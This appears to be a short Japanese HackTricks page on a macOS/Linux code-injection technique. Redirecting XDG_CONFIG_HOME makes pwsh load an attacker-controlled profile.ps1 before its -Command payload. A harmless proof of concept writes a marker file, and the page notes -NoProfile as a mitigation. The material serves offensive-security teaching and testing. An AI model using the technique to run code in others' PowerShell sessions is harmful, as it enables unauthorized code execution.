# macOS PowerShell Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## `XDG_CONFIG_HOME` と PowerShell プロファイル

macOS と Linux では、PowerShell は XDG configuration paths を使用し、`pwsh` の起動時にユーザーのプロファイルスクリプトを実行します。`XDG_CONFIG_HOME` をリダイレクトすると、`powershell/profile.ps1` と console-host-specific な `powershell/Microsoft.PowerShell_profile.ps1` を含むディレクトリが変更されるため、そこに配置した制御ファイルによって `-Command` payload の前にコードを実行できます。<sup>[[1]](#references)[[2]](#references)</sup>
```bash
mkdir -p /tmp/ps-config/powershell
cat >/tmp/ps-config/powershell/Microsoft.PowerShell_profile.ps1 <<'PS1'
New-Item -ItemType File -Path /tmp/powershell-profile-executed -Force | Out-Null
PS1

XDG_CONFIG_HOME=/tmp/ps-config pwsh -Command '$true'
```
これは、Windows 以外のプラットフォーム上の PowerShell 6+（`pwsh`）に適用されます。Windows PowerShell では、異なる profile の場所が使用されます。`pwsh -NoProfile` は profile の読み込みを抑制します。また、他の PowerShell host が異なる script を選択する可能性があるため、`HOME` と host 固有の profile 名も確認してください。

## References

- [1] [PowerShell の環境変数と XDG パス](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_environment_variables)
- [2] [PowerShell の profile](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_profiles)
{{#include ../../../banners/hacktricks-training.md}}
